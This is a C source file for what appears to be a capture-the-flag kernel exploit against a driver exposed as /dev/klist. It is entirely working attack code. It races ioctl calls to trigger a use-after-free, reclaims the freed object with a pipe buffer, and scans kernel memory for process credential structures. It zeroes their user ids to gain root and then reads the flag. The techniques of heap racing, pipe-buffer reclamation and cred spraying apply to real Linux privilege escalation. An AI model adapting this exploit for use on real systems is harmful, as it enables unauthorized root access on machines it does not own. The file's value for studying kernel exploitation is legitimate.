/*************************************************************
 * File Name: exp.c
 * 
 * Created on: 2019-10-27 01:52:55
 * Author: raycp
 * 
 * Last Modified: 2019-10-30 05:23:42
 * Description: race condition to form uaf, with pipe kernel buf to solve.
************************************************************/


#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <fcntl.h>
#include <inttypes.h>
#include <sys/ioctl.h>
#include <pthread.h>
#include <stdlib.h>
#include <string.h>

#define BUF_SIZE 0x280

struct user_data
{
    uint64_t size;
    void* ptr;
};

void die(const char* msg)
{
    perror(msg);
    _exit(-1);          
}

void select_item(int fd, uint64_t idx)
{
    ioctl(fd, 0x1338, idx);
    return ;
}

void add_item(int fd, void* user_input)
{
    ioctl(fd, 0x1337, user_input);
    return ;
}

void list_head(int fd, void* buff)
{
    ioctl(fd, 0x133a, buff);
    return ;
}

void remove_item(int fd, uint64_t idx)
{
    ioctl(fd, 0x1339, idx);
    return ;
}

void list_write(int fd, void* buff, uint32_t size)
{
    write(fd, buff, size);
    return ;
}

void list_read(int fd, void* buff, uint32_t size)
{
    read(fd, buff, size);
    return ;
}

void check_win(uint32_t i) 
{
    while(1) {
        sleep(1);
        if (getuid() == 0) {
            printf("root at thread: %d\n",i);
            system("cat /flag");
            exit(0);
        }
    }
}

int main()
{

    char bufA[BUF_SIZE];
    char bufB[BUF_SIZE];
    char buf_child[BUF_SIZE];
    char buf_father[BUF_SIZE];
    char evil_buff[BUF_SIZE];
    struct user_data user_inputA, user_inputB;

    int fd = open("/dev/klist",  O_RDWR);
    if(fd == -1){
        die("open klist failed");
    }

    memset(bufA, 'A', sizeof(bufA));
    memset(bufB, 'B', sizeof(bufB));
    memset(evil_buff, 'E', sizeof(evil_buff));

    user_inputA.ptr = bufA;
    user_inputA.size = BUF_SIZE-24;

    user_inputB.ptr = bufB;
    user_inputB.size = BUF_SIZE-24;

    
    
    add_item(fd, (void*)&user_inputA);

    select_item(fd, 0);

	int pid = fork();
    if(pid < 0)
    {
        puts("[*] fork error!");
        _exit(0);
    }
    else if(pid == 0) {
        // step 1 fork 200 process to spray cred
        for(int i = 0; i < 200; i++) {
            if(fork() == 0)
                check_win(i);  // loop to check whether it's root or not                   
        }

        while(1){
            add_item(fd, (void*)&user_inputA); // race to form uaf here
            select_item(fd, 0);
            remove_item(fd, 0);
            add_item(fd, (void*)&user_inputB); // if uaf here, it will be the same memory with user_inputA, so the content of memory will change form 'A' to 'B'
            list_read(fd, buf_child, BUF_SIZE-24);
            if(buf_child[0]!='A'){
                printf("[+] uaf triggered\n");
                break;
            }
            remove_item(fd, 0);
         }

        sleep(1);
        remove_item(fd, 0); //remove the B to free the kernel memory.

        // step 2 alloc the kernel memory in pipe to form uaf
        int fd_evil[2];
        pipe(&fd_evil[0]);
        // step 3 overwite the item size to hex('EEEE')
        write(fd_evil[1], evil_buff, sizeof(evil_buff));
        // step 4 read item to look for legal cred and change the cred's id from 1000 to 0 to achieve privilege escalation.
		unsigned int *ibuf = (unsigned int *)malloc(0x1000000);
        list_read(fd, ibuf, 0x1000000);
		int j;
		unsigned long max_i = 0;
		int count = 0;
		for(int i = 0; i < 0x1000000/4; i++) 
		{
		  if (ibuf[i] == 1000 && ibuf[i+1] == 1000 && ibuf[i+7] == 1000) 
		  {
			printf("[+] got cred at offset: 0x%x\n", i);
			max_i = i+8;
			for(j = 0; j < 8; j++)
			  ibuf[i+j] = 0;
			count++;
			if(count >= 2)
			  break;
		  }
		}
        list_write(fd, ibuf, max_i*4);  // write back here
        check_win(1);
    }
    else {
        while(1) {
            // race compete in father process with list_head function.
            list_head(fd, buf_father);
            list_read(fd, buf_father, BUF_SIZE-24);
            if(buf_father[0] != 'A')
                break;
        }
        check_win(0);
    }

    return 0;
}
